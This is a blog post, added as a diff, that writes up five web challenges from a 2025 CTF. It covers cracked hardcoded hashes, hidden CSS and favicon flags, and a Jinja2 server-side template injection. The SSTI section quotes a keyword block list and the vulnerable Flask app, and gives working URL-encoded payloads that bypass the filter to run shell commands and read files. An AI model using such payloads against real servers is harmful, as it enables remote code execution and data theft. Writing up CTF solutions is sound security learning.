@@ -1,0 +1,314 @@
+---
+layout: post
+title:  "v1t 2025 Web challenges"
+date:   2025-11-02 16:54:10 -0400
+author: robo.uzi
+tags: [CTF]
+permalink: /v1t-web/
+---
+* TOC
+{:toc}
+
+## Login Panel
+
+**Category**: web
+
+**Description**: login 
+[https://tommytheduck.github.io/login](https://tommytheduck.github.io/login) 
+
+Visiting `https://tommytheduck.github.io/login/` I am prompted by the browser to login with a username and password. 
+
+We get a page with some javascript in response to the request to `/login`:
+```html
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Login Panel</title>
+</head>
+<body>
+  <script>
+    async function toHex(buffer) {
+      const bytes = new Uint8Array(buffer);
+      let hex = '';
+      for (let i = 0; i < bytes.length; i++) {
+        hex += bytes[i].toString(16).padStart(2, '0');
+      }
+      return hex;
+    }
+
+    async function sha256Hex(str) {
+      const enc = new TextEncoder();
+      const data = enc.encode(str);
+      const digest = await crypto.subtle.digest('SHA-256', data);
+      return toHex(digest);
+    }
+
+    function timingSafeEqualHex(a, b) {
+      if (a.length !== b.length) return false;
+      let diff = 0;
+      for (let i = 0; i < a.length; i++) {
+        diff |= a.charCodeAt(i) ^ b.charCodeAt(i);
+      }
+      return diff === 0;
+    }
+
+    (async () => {
+      const ajnsdjkamsf = 'ba773c013e5c07e8831bdb2f1cee06f349ea1da550ef4766f5e7f7ec842d836e'; // replace
+      const lanfffiewnu = '48d2a5bbcf422ccd1b69e2a82fb90bafb52384953e77e304bef856084be052b6'; // replace
+
+      const username = prompt('Enter username:');
+      const password = prompt('Enter password:');
+
+      if (username === null || password === null) {
+        alert('Missing username or password');
+        return;
+      }
+
+      const uHash = await sha256Hex(username);
+      const pHash = await sha256Hex(password);
+
+      if (timingSafeEqualHex(uHash, ajnsdjkamsf) && timingSafeEqualHex(pHash, lanfffiewnu)) {
+        alert(username+ '{'+password+'}');
+      } else {
+        alert('Invalid credentials');
+      }
+    })();
+  </script>
+</body>
+</html>
+```
+There are credentials hardcoded so I take the hashes `ba773c013e5c07e8831bdb2f1cee06f349ea1da550ef4766f5e7f7ec842d836e`
+`48d2a5bbcf422ccd1b69e2a82fb90bafb52384953e77e304bef856084be052b6` and put them in crackstation.
+
+Login with credentials `v1t:p4ssw0rd`
+
+`v1t{p4ssw0rd}`
+
+___
+
+## Stylish Flag
+
+**Category**: web
+
+**Description**: Are you a front end dev? 
+[https://tommytheduck.github.io/stylish_flag/](https://tommytheduck.github.io/stylish_flag/) 
+
+I visit the site `tommytheduck.github.io/stylish_flag` and see this HTML:
+```html
+<!DOCTYPE html> 
+<html lang="en"> 
+
+<head> 
+  <meta charset="UTF-8"> 
+  <title>Stylish Flag</title> 
+  <link rel="stylesheet" href="[csss.css](view-source:https://tommytheduck.github.io/stylish_flag/csss.css)"> 
+</head> 
+
+<body> 
+  <h1>where is the flag ;-;</h1> 
+  <br> 
+  <div hidden class="flag"></div> 
+</body> 
+</html>
+```
+
+Edit the html to contain this which makes the flag visible:
+```html
+<div class="flag" style="transform: none !important; width: 10px !important; height: 10px !important; opacity: 1 !important; position: absolute !important; left: 0 !important;"></div>
+```
+
+`v1t{H1D30UT_CSS}`
+
+___
+
+## Tiny Flag
+
+**Category**: web
+
+**Description**: Do you see the tiny flag :> 
+[https://tommytheduck.github.io/tiny_flag](https://tommytheduck.github.io/tiny_flag) 
+
+I go to `https://tommytheduck.github.io/tiny_flag/` and just find the flag in the favicon at `view-source:https://tommytheduck.github.io/tiny_flag/favicon.ico`. 
+
+`v1t{T1NY_ICO}`
+
+___
+
+## Mark The Lyrics
+
+**Category**: web
+
+**Description**: My friend make a website for his favourite, but the lyrics seem a little bit odd. 
+[http://tommytheduck.github.io/mckey](http://tommytheduck.github.io/mckey) 
+
+I visit the site and go to `view-source:https://tommytheduck.github.io/mckey/`. I see characters being pointed out wrapped in `<mark></mark>` tags. 
+
+I can see in these two parts the start of the flag `V1T{`. 
+```html
+<div class="section"> 
+<div class="tag">{<mark>V</mark>erse <mark>1</mark>: Sơn Tùng M-<mark>T</mark>P}</div> 
+<pre>Cứ-cứ-cứ-cứ quên anh vậy đi (Vậy đi) 
+Nhạt nhoà sương tan, ái ân, mây trôi buồn 
+Những môi hôn chìm sâu (Sâu) 
+Còn đâu nụ cười thơ ngây đó-đó? 
+Cứ xa anh vậy đi 
+Đường mòn xưa kia dẫn lối đôi chân lẻ loi, oh-oh, oh-oh-oh-oh 
+Anh lẻ loi</pre> 
+</div> 
+
+<div class="section"> 
+<div class="tag"><mark>{</mark>Pre-Chorus: Sơn Tùng M-TP}</div> 
+<pre>Mưa rơi nhẹ rơi (Yeah, yeah), mưa đừng mang hoàng hôn xua tan bóng anh 
+Chua cay nào hay? (Yeah, yeah) Thương là đau, màn đêm chia hai giấc mơ 
+Giọt nước mắt vô tâm thờ ơ 
+Ngàn câu ca sao nghe hững hờ? 
+Anh lặng im, em lặng im 
+Sương gió bủa vây (Em lặng im), oh</pre> 
+</div>
+```
+
+Get the source: `curl -s https://tommytheduck.github.io/mckey/ -o mckey.html`
+
+Run this python to get the flag:
+```python
+from bs4 import BeautifulSoup
+
+with open("mckey.html", "r", encoding="utf-8") as f:
+    soup = BeautifulSoup(f, "html.parser")
+
+marks = soup.find_all("mark")
+flag = "".join(mark.get_text() for mark in marks)
+print(flag)
+```
+
+`V1T{MCK-pap-cool-ooh-yeah}`
+
+___
+{% raw %}
+## 5571
+
+**Category**: web
+
+**Description**: My friend got highest mark with this challenge, can you beat it :>
+
+[http://chall.v1t.site:30300/](http://chall.v1t.site:30300/)
+
+I go to the site and see this:
+```shell
+# NotePad
+
+A tiny notes frontend — paste text below and press **Render**. Inputs are sanitized server-side; if something is blocked well its blocked lol
+```
+
+In an HTML comment that certain keywords are blocked:
+```html
+<!-- Remember to block potentially dangerous literals in the backend! BLOCKED_LITERALS = [ '{', '}', '__', 'open', 'os', 'subprocess', 'import', 'eval', 'exec', 'system', 'popen', 'builtins', 'globals', 'locals', 'getattr', 'setattr', 'class', 'compile', 'inspect' ] -->
+```
+
+I looked at the request which says "werkzeug" so it is highly likely I need to find SSTI. After some testing I find url encoding bypassed the filter. Rendering `%7B%7B7*7%7D%7D` causes `49` to be output so I know I have SSTI.
+
+When I went to `http://chall.v1t.site:30300/scan` I saw a file path for `app.py`. This was a page to "scan" the server and show some basic details about its status:
+```html
+root 1 0.0 0.1 15884 3140 ? Ss 00:00 0:00 /sbin/init www-data 9 0.1 0.5 32540 12320 ? S 00:01 0:01 python3 /app/app.py
+```
+
+I get the `app.py` file with this payload:
+```shell
+%7B%7Brequest.application.%5F%5Fgl%6Fbals%5F%5F.%5F%5Fbu%69ltins%5F%5F.%5F%5Fim%70ort%5F%5F('o%73').po%70en('cat /app/app.py').read()%7D%7D
+```
+You can use url encoding to also break up the keywords and get them past the filter.
+
+Contents of `app.py`:
+```python
+# app.py
+from flask import Flask, request, render_template_string, render_template, redirect, url_for
+from jinja2 import Template, Environment
+import re
+import logging
+
+app = Flask(__name__)
+logging.basicConfig(level=logging.INFO)
+
+BLOCKED_LITERALS = [
+    '{', '}', '__', 'open', 'os', 'subprocess', 'import', 'eval', 'exec',
+    'system', 'popen', 'builtins', 'globals', 'locals', 'getattr', 'setattr',
+    'class', 'compile', 'inspect'
+]
+
+HEX_PATTERNS = [
+    re.compile(r'%([0-9A-Fa-f]{2})'),
+    re.compile(r'0x([0-9A-Fa-f]{2})'),
+    re.compile(r'\\x([0-9A-Fa-f]{2})'),
+]
+
+def decode_hex_sequences(s: str) -> str:
+    for pat in HEX_PATTERNS:
+        def sub(m):
+            try:
+                return chr(int(m.group(1), 16))
+            except:
+                return m.group(0)
+        s = pat.sub(sub, s)
+    return s
+
+def contains_blocked_literal(raw: str):
+    lowered = raw.lower()
+    for token in BLOCKED_LITERALS:
+        if token in lowered:
+            return True, token
+    return False, None
+
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    if request.method == 'POST':
+        raw = request.form.get('payload', '')
+        blocked, which = contains_blocked_literal(raw)
+        if blocked:
+            return render_template('index.html',
+                                   error=f"Input blocked: literal token '{which}' not allowed. Try encoding.",
+                                   result=None,
+                                   preview=raw)
+        decoded = decode_hex_sequences(raw)
+        try:
+            rendered = render_template_string(decoded)
+        except Exception as e:
+            rendered = f"<pre>Rendering error: {e}</pre>"
+
+        return render_template('index.html', result=rendered, preview=raw, error=None)
+
+    return render_template('index.html', result=None, preview=None, error=None)
+
+@app.route('/scan')
+def scan():
+    processes = [
+        "root      1  0.0  0.1  15884  3140 ?        Ss   00:00   0:00 /sbin/init",
+        "www-data  9  0.1  0.5  32540 12320 ?        S    00:01   0:01 python3 /app/app.py",
+    ]
+    file_tree = [
+        "/bin",
+        "/boot",
+        "/etc",
+        "/home/www",
+        "/var/www",
+        "/app",
+        "/app/flag.txt",
+    ]
+    return render_template('scan.html', processes=processes, file_tree=file_tree)
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000, debug=False)
+```
+
+I can see the path for the flag in `app.py` and get the file:
+```shell
+%7B%7Brequest.application.%5F%5Fgl%6Fbals%5F%5F.%5F%5Fbu%69ltins%5F%5F.%5F%5Fim%70ort%5F%5F('o%73').po%70en('cat /app/flag.txt').read()%7D%7D
+```
+
+Decoded payload:
+```shell
+{{request.application.__globals__.__builtins__.__import__('os').popen('cat /app/flag.txt').read()}}
+```
+{% endraw %}
+`v1t{n0th1ng_b34ts_url_ssti_9cfac8e6b8978e3f6037d9608fed7767}`
